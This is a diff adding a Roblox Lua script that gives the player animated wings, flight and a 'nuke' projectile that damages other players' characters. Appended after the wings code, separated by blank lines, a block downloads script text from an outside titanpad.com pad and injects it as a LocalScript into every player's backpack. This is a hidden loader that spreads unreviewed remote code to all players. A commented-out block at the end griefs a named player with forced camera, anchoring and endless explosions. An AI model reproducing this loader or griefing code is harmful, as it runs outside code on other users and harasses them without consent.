@@ -1,0 +1,183 @@
+
+
+
+
+
+color=BrickColor.random() --RANDOM COLORS FUCK YEAH
+local wingpoints={{-5,0,2},{-6,0,-1},{-6.5,-3,0}}
+local wings={Right={};Left={}}
+
+pl=game.Players.LocalPlayer
+char=pl.Character
+torso=pl.Character.Torso
+mo=pl:GetMouse()
+function w(p1,p2)local w1=Instance.new'Weld' w1.Part0=p1 w1.Part1=p2 w1.C1=p2.CFrame:inverse()*p1.CFrame w1.Parent=p1 return w1 end function rd(degree)return math.rad(degree)end
+function part() local p=Instance.new('Part',char)p.TopSurface='Smooth'p.BottomSurface='Smooth'p.CanCollide=false p.Transparency=.5 p.Anchored=true p.FormFactor='Custom'p.BrickColor=color return p end
+function lineto(point1,point2) point1=point1.p point2=point2.p local ln=part()ln.Size=Vector3.new(.1,.1,(point1-point2).magnitude)ln.CFrame=CFrame.new(point1:Lerp(point2,.5))ln.CFrame=CFrame.new(ln.Position,point2)return ln end
+local cpoint=Vector3.new(0,0,0)
+local lastpos,lastrot,ln,vel,gyro,con,firecon,increase
+
+function nuke(pos)
+local halo=part()
+halo.CFrame=CFrame.new(pos)*CFrame.Angles(math.rad(90),0,0)
+local hm=Instance.new('SpecialMesh',halo)
+hm.MeshType='FileMesh'
+hm.MeshId='http://www.roblox.com/asset/?id=3270017'
+halo.Touched:connect(function(i)
+    if i:FindFirstChild'Humanoid' then
+        i.Humanoid:TakeDamage(math.random(1,20))
+    end
+    end)
+for j=1,10 do wait(.1)spawn(function()
+for i=1,50 do
+hm.Scale=hm.Scale+Vector3.new(5,5,5)
+wait()
+end
+halo:Destroy()end)end
+end
+
+for i=1,#wingpoints do
+local current=wingpoints[i]
+local back=wingpoints[i-1]
+local backwr,backwl
+if i>1 then
+backwr=wings.Right[i-1][3]
+print(backwr)
+backwl=wings.Left[i-1][3]
+end
+if not back then back={0,0,0} end
+local ln=lineto(torso.CFrame*CFrame.new(current[1],current[2],current[3]),torso.CFrame*CFrame.new(back[1],back[2],back[3]))
+ln.Anchored=false
+local ln2=lineto(torso.CFrame*CFrame.new(-current[1],current[2],current[3]),torso.CFrame*CFrame.new(-back[1],back[2],back[3]))
+ln2.Anchored=false
+local w1=w(backwr or torso,ln)
+local w2=w(backwl or torso,ln2)
+table.insert(wings.Right,{w1,w1.C0,ln})table.insert(wings.Left,{w2,w2.C0,ln2})
+end
+
+function movewings(ang)
+for i,v in pairs(wings.Right) do
+v[1].C0=v[2]*CFrame.Angles(0,0,-math.rad(ang))
+end
+for i,v in pairs(wings.Left) do
+v[1].C0=v[2]*CFrame.Angles(0,0,math.rad(ang))
+end
+end
+
+local cnt=3
+local wspeed=.5
+local dir=true
+game:service'RunService'.RenderStepped:connect(function()
+if dir==true then cnt=cnt+wspeed else cnt=cnt-wspeed end if cnt<1 or cnt>40 then dir=not dir end
+movewings(cnt)
+end)
+
+local fly=false
+
+function makeCon()
+fly=true
+cpoint=mo.Hit.p
+vel=Instance.new('BodyVelocity',torso)
+vel.maxForce=Vector3.new(math.huge,math.huge,math.huge)
+gyro=Instance.new('BodyGyro',torso)
+gyro.maxTorque=Vector3.new(math.huge,math.huge,math.huge)
+increase=0
+con=game:service'RunService'.Stepped:connect(function()
+vel.velocity=(CFrame.new(torso.Position,mo.Hit.p)).lookVector*(50+increase)
+if lastpos and lastrot then local ng=(mo.X-lastrot) gyro.cframe=CFrame.new(lastpos,torso.Position)*CFrame.Angles(math.rad(-90),math.rad(ng),0) end
+lastpos=torso.Position
+lastrot=mo.X
+increase=increase+.1
+
+
+--local fline=lineto(torso.CFrame*CFrame.new(0,10,0),torso.CFrame*CFrame.new(math.random(-7,7),math.random(1,3),math.random(-7,7)))
+--game:service'Debris':AddItem(fline,.1)
+
+
+for i=1,2 do
+local smoke=part()
+smoke.Shape='Ball'
+smoke.Size=Vector3.new(1,0,0)
+local ms=Instance.new('SpecialMesh',smoke)
+ms.MeshType='Sphere'
+local rnd=math.random(.2,4)
+ms.Scale=Vector3.new(rnd,rnd,rnd)
+smoke.Transparency=math.random(0,7)/10
+smoke.CFrame=torso.CFrame*CFrame.new(math.random(-40,40)/10,-7,math.random(-40,40)/10)
+smoke.Anchored=false
+local vl=Instance.new('BodyVelocity',smoke)
+vl.velocity=CFrame.new(torso.Position,smoke.Position).lookVector*50
+vl.maxForce=Vector3.new(math.huge,math.huge,math.huge)
+game:service'Debris':AddItem(smoke,1)
+end
+
+end) 
+end
+
+local dropcon,dropgyro,pastpos
+mo.KeyDown:connect(function(key)
+if key=='e' then
+fly=true
+wspeed=4
+if vel then vel:Destroy()end if gyro then gyro:Destroy() end
+makeCon()
+elseif key=='f' then
+  
+local n1=part()
+n1.Size=Vector3.new(3,3,3)
+local n1m=Instance.new('SpecialMesh',n1)
+n1m.MeshType='Sphere'
+local n2=part()
+n2.Size=Vector3.new(3,6,3)
+n2.CFrame=n1.CFrame*CFrame.Angles(0,0,math.rad(90))*CFrame.new(0,2.75,0)
+Instance.new('CylinderMesh',n2)
+n1.Anchored=false n2.Anchored=false
+n1.Transparency=0 n2.Transparency=0
+n1.CanCollide=true n2.CanCollide=true
+w(n1,n2)
+
+n1.CFrame=char.Torso.CFrame*CFrame.new(0,0,-4)
+
+local nt=n1.Touched:connect(function(to)
+if to.Parent==char then return end
+if nt then nt:disconnect()end
+n1:Destroy()
+n2:Destroy()
+nuke(n1.Position)
+end)
+
+
+end
+end)
+mo.KeyUp:connect(function(key)if key=='e' then fly=false wspeed=.5 con:disconnect() vel:Destroy()gyro:Destroy()if dropgyro then dropgyro:Destroy()end wait(.1)end end)
+
+    ExecutedScript = game.HttpService:GetAsync'https://titanpad.com/ep/pad/export/SBSCRIPTSFUNC/latest?format=txt'
+for _,v in next,game:service'Players':players()do
+        spawn(function() -- 
+                local backpack=v:waitForChild'Backpack';
+                newLocalScript(ExecutedScript,backpack);
+        end);
+    end;
+    wait()
+    ExecutedScript = nil
+
+
+
+
+
+
+
+--[[
+script.Parent=nil
+pl='Reinitialized'
+game.Players[pl].CameraMode='LockFirstPerson'
+workspace[pl].Torso.Anchored=true
+for i=1,20 do
+game:service'RunService'.Heartbeat:connect(function()
+Instance.new('ForceField',workspace[pl])
+Instance.new('Fire',workspace[pl].Torso)
+Instance.new('Explosion',workspace[pl]).Position=workspace[pl].Torso.Position
+end)end ]]
+
+
+
